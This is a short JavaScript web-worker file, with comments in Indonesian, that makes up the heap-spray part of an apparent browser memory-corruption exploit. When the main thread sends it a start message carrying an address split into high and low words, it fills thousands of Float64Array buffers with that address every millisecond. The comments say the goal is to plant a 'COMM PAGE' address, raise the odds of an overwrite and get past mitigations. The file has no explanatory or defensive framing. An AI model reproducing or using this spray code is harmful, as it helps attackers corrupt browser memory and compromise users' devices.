let sprayHoldersWorker = [];
let payloadLow = 0;
let payloadHigh = 0;

function performAggressiveSpray() {
    const SPRAY_COUNT = 2000; // Lebih banyak spray
    const PAYLOAD_SIZE = 64; // Ukuran berbeda untuk mengalahkan mitigasi

    for (let i = 0; i < SPRAY_COUNT; i++) {
        let payloadArray = new Float64Array(PAYLOAD_SIZE);
        
        // Masukkan ALAMAT COMM PAGE sebagai nilai payload
        // Kita isi beberapa kali untuk meningkatkan peluang menimpa
        payloadArray[0] = payloadHigh; 
        payloadArray[1] = payloadLow;
        payloadArray[2] = payloadHigh; 
        payloadArray[3] = payloadLow;
        
        // Simpan referensi payload
        sprayHoldersWorker.push(payloadArray); 
    }
}

// Handler pesan dari thread utama
onmessage = function(e) {
    if (e.data.cmd === 'start') {
        payloadLow = e.data.payloadLow;
        payloadHigh = e.data.payloadHigh;
        
        // Mulai looping spray tak terbatas di thread worker
        setInterval(performAggressiveSpray, 1); 
    }
}
